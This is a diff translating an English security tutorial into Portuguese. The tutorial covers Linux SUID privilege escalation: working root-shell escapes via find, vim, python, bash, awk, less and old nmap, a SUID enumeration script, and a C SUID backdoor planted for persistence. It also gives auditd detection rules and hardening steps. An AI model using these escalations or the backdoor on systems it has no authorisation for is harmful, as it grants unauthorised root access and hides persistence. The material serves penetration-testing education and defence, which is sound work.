@@ -1,7 +1,7 @@
 ---
-title: "SUID Abuse — Escalating to Root with Forgotten Binaries"
+title: "Abuso de SUID — Escalando para Root com Binários Esquecidos"
 date: 2025-01-14
-description: "How misconfigured SUID binaries on Linux can be weaponized for privilege escalation using GTFOBins techniques and custom enumeration scripts."
+description: "Como binários SUID mal configurados no Linux podem ser usados como arma para escalonamento de privilégios usando técnicas do GTFOBins e scripts de enumeração customizados."
 category: privesc
 os: [linux]
 difficulty: medium
@@ -12,74 +12,74 @@ status: published
 readingTime: 9
 ---
 
-## What is SUID?
+## O que é SUID?
 
-The **SUID (Set User ID)** bit is a special Linux permission that causes an executable to run with the **privileges of the file owner** rather than the user invoking it.
+O bit **SUID (Set User ID)** é uma permissão especial do Linux que faz com que um executável rode com os **privilégios do dono do arquivo** em vez do usuário que o invocou.
 
-When a binary owned by `root` has the SUID bit set, any user who executes it gains temporary root-level access for the duration of that process. This is by design for binaries like `/usr/bin/passwd` — but becomes a critical attack vector when found on unexpected binaries.
+Quando um binário cujo dono é `root` possui o bit SUID ativado, qualquer usuário que o execute ganha acesso temporário em nível de root pela duração daquele processo. Isso é intencional para binários como `/usr/bin/passwd` — mas se torna um vetor crítico de ataque quando encontrado em binários inesperados.
 
 ```bash
-# Permission example — the 's' in owner execute position = SUID set
+# Exemplo de permissão — o 's' na posição de execução do dono = SUID ativado
 -rwsr-xr-x 1 root root 67816 Jan  5 12:00 /usr/bin/passwd
 ```
 
-> **MITRE ATT&CK:** This technique maps to [T1548.001 — Setuid and Setgid](https://attack.mitre.org/techniques/T1548/001/) under the Privilege Escalation tactic (TA0004).
+> **MITRE ATT&CK:** Esta técnica é mapeada como [T1548.001 — Setuid and Setgid](https://attack.mitre.org/techniques/T1548/001/) sob a tática de Escalonamento de Privilégios (Privilege Escalation - TA0004).
 
 ---
 
-## Step 1 — Enumerate SUID Binaries
+## Passo 1 — Enumerar Binários SUID
 
-The first step is finding all SUID-enabled binaries on the system.
+O primeiro passo é encontrar todos os binários com SUID habilitado no sistema.
 
 ```bash
-# Find all SUID binaries (suppress permission-denied errors)
+# Encontra todos os binários SUID (suprime erros de permissão negada)
 find / -perm -u=s -type f 2>/dev/null
 
-# Limit search to common binary paths for speed
+# Limita a busca a caminhos comuns de binários para maior velocidade
 find /usr /bin /sbin /opt /home -perm -u=s -type f 2>/dev/null
 
-# Also check SGID binaries (runs as group owner)
+# Também checa binários SGID (roda como dono do grupo)
 find / -perm -g=s -type f 2>/dev/null
 ```
 
-A clean system will return a predictable, short list. Look for anything **unusual** — non-standard paths, custom scripts, or development tools.
+Um sistema limpo retornará uma lista curta e previsível. Procure por qualquer coisa **incomum** — caminhos não padrão, scripts customizados, ou ferramentas de desenvolvimento.
 
 ---
 
-## Step 2 — Cross-Reference with GTFOBins
+## Passo 2 — Cruzamento de Referência com o GTFOBins
 
-[GTFOBins](https://gtfobins.github.io/) is the authoritative reference for Unix binaries that can be abused when they have elevated permissions.
+O [GTFOBins](https://gtfobins.github.io/) é a referência definitiva para binários Unix que podem ser abusados quando possuem permissões elevadas.
 
 ### find
 
 ```bash
-# Verify SUID is set
+# Verifica se o SUID está ativado
 ls -la $(which find)
 # -rwsr-xr-x 1 root root 204112 ... /usr/bin/find
 
-# Exploitation — spawns root shell
+# Exploração — spawna uma shell root
 find . -exec /bin/sh -p \; -quit
 
-# Verify escalation
+# Verifica o escalonamento
 whoami
 # root
 ```
 
-The `-p` flag is critical — it tells `sh` to **preserve the effective UID** rather than dropping it.
+A flag `-p` é crítica — ela diz ao `sh` para **preservar o UID efetivo** em vez de descartá-lo.
 
 ### vim / vi
 
 ```bash
-# Check
+# Checa
 ls -la $(which vim)
 
-# Method 1: via Python3 extension
+# Método 1: via extensão Python3
 vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
 
-# Method 2: direct shell spawn
+# Método 2: spawn direto de shell
 vim -c ':!sh -p'
 
-# Method 3: via shell escape in normal mode (inside vim)
+# Método 3: via escape de shell no modo normal (dentro do vim)
 # :set shell=/bin/sh
 # :shell
 ```
@@ -89,14 +89,14 @@ vim -c ':!sh -p'
 ```bash
 python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 
-# Also works with older python2
+# Também funciona no python2 mais antigo
 python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 ```
 
 ### bash
 
 ```bash
-# Only exploitable if SUID is on bash itself (rare but happens on CTFs)
+# Apenas explorável se o SUID estiver no próprio bash (raro, mas acontece em CTFs)
 ls -la /bin/bash
 # -rwsr-xr-x 1 root root ...
 
@@ -105,10 +105,10 @@ bash -p
 # root
 ```
 
-### nmap (legacy versions < 5.35)
+### nmap (versões legacy < 5.35)
 
 ```bash
-# Interactive mode available on old nmap versions
+# Modo interativo disponível em versões antigas do nmap
 nmap --interactive
 nmap> !sh
 ```
@@ -134,23 +134,23 @@ awk 'BEGIN {system("/bin/sh -p")}'
 ### less / more
 
 ```bash
-# Inside less/more pager
+# Dentro do pager less/more
 less /etc/passwd
-# Then type:
+# Então digite:
 !/bin/sh
 ```
 
 ---
 
-## Step 3 — Automated Enumeration Script
+## Passo 3 — Script de Enumeração Automatizada
 
-The following script cross-references discovered SUID binaries with a known-exploitable list and outputs prioritized targets.
+O script a seguir cruza a referência de binários SUID descobertos com uma lista de conhecidos por serem exploráveis e gera os alvos priorizados.
 
 ```bash
 #!/usr/bin/env bash
-# suid_hunter.sh — SUID enumeration and triage
-# Usage: ./suid_hunter.sh
-# Author: r3d/ops | KBM Security
+# suid_hunter.sh — Enumeração e triagem de SUID
+# Uso: ./suid_hunter.sh
+# Autor: r3d/ops | KBM Security
 
 RED='\033[0;31m'
 YEL='\033[0;33m'
@@ -163,13 +163,13 @@ KNOWN_EXPLOITABLE+="|nc|netcat|awk|less|more|man|ftp|gdb|strace|ltrace|tclsh"
 KNOWN_EXPLOITABLE+="|env|expect|lua|php|ruby|node|git|zip|unzip|7z|aria2c"
 
 echo -e "${BLU}[*] SUID Binary Hunter — r3d/ops${RST}"
-echo -e "${BLU}[*] Scanning filesystem...${RST}\n"
+echo -e "${BLU}[*] Escaneando o filesystem...${RST}\n"
 
 BINS=$(find / -perm -u=s -type f 2>/dev/null)
 TOTAL=$(echo "$BINS" | wc -l)
 
-echo -e "[*] Found ${YEL}${TOTAL}${RST} SUID binaries\n"
-echo -e "[*] Checking against known exploitable list...\n"
+echo -e "[*] Encontrados ${YEL}${TOTAL}${RST} binários SUID\n"
+echo -e "[*] Checando contra a lista de exploráveis conhecidos...\n"
 
 HIT=0
 while IFS= read -r bin; do
@@ -178,8 +178,8 @@ while IFS= read -r bin; do
   perms=$(stat -c '%A' "$bin" 2>/dev/null)
 
   if echo "$name" | grep -qiE "$KNOWN_EXPLOITABLE"; then
-    echo -e "  ${RED}[!!!] EXPLOITABLE:${RST} $bin"
-    echo -e "       Owner: ${YEL}${owner}${RST} | Perms: ${perms}"
+    echo -e "  ${RED}[!!!] EXPLORÁVEL:${RST} $bin"
+    echo -e "       Dono: ${YEL}${owner}${RST} | Perm: ${perms}"
     echo -e "       GTFOBins: ${BLU}https://gtfobins.github.io/gtfobins/${name}/#suid${RST}\n"
     HIT=$((HIT + 1))
   else
@@ -187,17 +187,17 @@ while IFS= read -r bin; do
   fi
 done <<< "$BINS"
 
-echo -e "\n[*] Summary: ${RED}${HIT} potential target(s)${RST} out of ${TOTAL} total SUID binaries"
+echo -e "\n[*] Resumo: ${RED}${HIT} alvo(s) em potencial${RST} de ${TOTAL} binários SUID no total"
 ```
 
 ---
 
-## Step 4 — Writing a Custom SUID Backdoor (Lab Scenario)
+## Passo 4 — Escrevendo um Backdoor SUID Customizado (Cenário de Lab)
 
-In authorized red team engagements, you may need to plant a persistent SUID shell for post-exploitation access.
+Em operações de red team autorizadas, você pode precisar plantar um shell SUID persistente para acesso pós-exploração.
 
 ```bash
-# As root — compile a minimal setuid shell wrapper
+# Como root — compila um wrapper setuid mínimo para a shell
 cat > /tmp/rootshell.c << 'EOF'
 #include <stdio.h>
 #include <unistd.h>
@@ -210,98 +210,98 @@ int main() {
 }
 EOF
 
-# Compile and set SUID
+# Compila e seta o SUID
 gcc /tmp/rootshell.c -o /tmp/rootshell
 chmod u+s /tmp/rootshell
 
-# Low-privilege user can now call it
+# Um usuário de baixo privilégio agora pode chamá-lo
 /tmp/rootshell
 # bash-5.1# whoami
 # root
 ```
 
-> **DANGER:** Never deploy SUID backdoors on production systems or without explicit written authorization. This is for authorized lab environments only.
+> **PERIGO:** Nunca faça deploy de backdoors SUID em sistemas de produção ou sem autorização explícita por escrito. Isso é apenas para ambientes de laboratório autorizados.
 
 ---
 
-## Detection & Mitigation
+## Detecção & Mitigação
 
-### Blue Team Detections
+### Detecções do Blue Team
 
-| Indicator | Data Source | Rule Logic |
+| Indicador | Fonte de Dados | Lógica da Regra |
 |-----------|-------------|------------|
-| New SUID binary created | auditd / inotify | `find / -newer /tmp -perm -4000` |
-| SUID binary executes shell | auditd execve | parent=suid_binary, child=/bin/sh |
-| Unexpected SUID owner | file integrity | owner=root AND path NOT IN baseline |
-| `-p` flag passed to shell | process args | `sh -p` OR `bash -p` in cmdline |
+| Novo binário SUID criado | auditd / inotify | `find / -newer /tmp -perm -4000` |
+| Binário SUID executa shell | auditd execve | parent=suid_binary, child=/bin/sh |
+| Dono SUID inesperado | file integrity | owner=root AND path NOT IN baseline |
+| Flag `-p` passada ao shell | process args | `sh -p` OR `bash -p` in cmdline |
 
-### Hardening Commands
+### Comandos de Hardening
 
 ```bash
-# Audit all SUID binaries — save baseline
+# Audita todos os binários SUID — salva uma baseline
 find / -perm -4000 -type f 2>/dev/null > /root/suid_baseline.txt
 
-# Remove SUID from a specific binary
-chmod u-s /path/to/binary
+# Remove o SUID de um binário específico
+chmod u-s /caminho/para/binario
 
-# Mount partitions with nosuid to prevent SUID on those filesystems
-# In /etc/fstab:
+# Monta partições com nosuid para prevenir SUID naqueles filesystems
+# Em /etc/fstab:
 # /dev/sdb1 /data ext4 defaults,nosuid,noexec 0 0
 
-# AppArmor profile enforcement
+# Enforcement de profile do AppArmor
 aa-enforce /usr/bin/find
 
-# Verify binary integrity against package manager
+# Verifica a integridade do binário contra o package manager
 dpkg --verify    # Debian/Ubuntu
 rpm -Va          # RHEL/CentOS
 ```
 
-### Recommended Monitoring Rules (auditd)
+### Regras de Monitoramento Recomendadas (auditd)
 
 ```bash
 # /etc/audit/rules.d/suid.rules
 
-# Monitor SUID binary execution
+# Monitora a execução de binário SUID
 -a always,exit -F arch=b64 -S execve -F euid=0 -F auid>=1000 -k suid_exec
 
-# Monitor chmod/chown changing SUID bit
+# Monitora chmod/chown mudando o bit SUID
 -a always,exit -F arch=b64 -S chmod -S fchmod -S fchmodat -F a1=04755 -k suid_create
 ```
 
 ---
 
-## Lab Setup
+## Setup de Laboratório
 
-To practice these techniques safely, spin up a vulnerable VM:
+Para praticar essas técnicas de forma segura, suba uma VM vulnerável:
 
 ```bash
-# Vagrant — intentionally vulnerable Linux box
+# Vagrant — box Linux intencionalmente vulnerável
 vagrant init bento/ubuntu-22.04
 vagrant up
 vagrant ssh
 
-# Manually set up a vulnerable binary for practice
+# Configura manualmente um binário vulnerável para prática
 sudo chmod u+s /usr/bin/find
 find . -exec /bin/sh -p \; -quit
 ```
 
-Alternatively, use dedicated platforms:
-- **HackTheBox** — Linux privilege escalation machines
-- **TryHackMe** — "Linux PrivEsc" room
-- **VulnHub** — Kioptrix, Mr. Robot series
+Alternativamente, use plataformas dedicadas:
+- **HackTheBox** — Máquinas de privilege escalation em Linux
+- **TryHackMe** — Sala "Linux PrivEsc"
+- **VulnHub** — Kioptrix, série Mr. Robot
 
 ---
 
-## Summary
+## Resumo
 
-| Binary | Exploit Method | Difficulty |
+| Binário | Método de Exploit | Dificuldade |
 |--------|---------------|------------|
-| `find` | `-exec /bin/sh -p` | Easy |
-| `python3` | `os.execl("/bin/sh","sh","-p")` | Easy |
-| `vim` | `:!sh -p` | Easy |
-| `bash` | `bash -p` | Easy |
-| `tar` | `--checkpoint-action=exec` | Medium |
-| `nmap` | `--interactive` (legacy) | Medium |
-| `awk` | `system("/bin/sh")` | Easy |
+| `find` | `-exec /bin/sh -p` | Fácil |
+| `python3` | `os.execl("/bin/sh","sh","-p")` | Fácil |
+| `vim` | `:!sh -p` | Fácil |
+| `bash` | `bash -p` | Fácil |
+| `tar` | `--checkpoint-action=exec` | Média |
+| `nmap` | `--interactive` (legacy) | Média |
+| `awk` | `system("/bin/sh")` | Fácil |
 
-The key takeaway: **any** binary with SUID set that allows arbitrary code execution or shell spawning is a path to root. Always enumerate SUID binaries as part of your Linux privilege escalation checklist.
+A chave para levar disso tudo: **qualquer** binário com SUID ativado que permita execução arbitrária de código ou o spawn de uma shell é um caminho para o root. Sempre enumere binários SUID como parte do seu checklist de escalonamento de privilégios no Linux.
